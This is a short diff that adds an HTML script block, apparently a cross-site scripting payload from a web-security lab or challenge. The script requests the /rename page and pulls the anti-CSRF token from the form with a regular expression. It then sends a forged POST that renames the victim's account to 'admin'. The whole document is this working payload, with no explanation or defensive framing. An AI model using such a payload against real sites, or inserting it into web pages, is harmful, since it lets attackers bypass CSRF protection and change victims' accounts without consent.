@@ -1,0 +1,13 @@
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = handleResponse;
+    req.open('get','/rename',true);
+    req.send();
+    function handleResponse() {
+        var token = this.responseText.match(/name="token" value=(\w+)/)[1];
+        var changeReq = new XMLHttpRequest();
+        changeReq.open('post', '/rename', true);
+        changeReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        changeReq.send("token="+token+"&name=admin");
+    }
+</script>
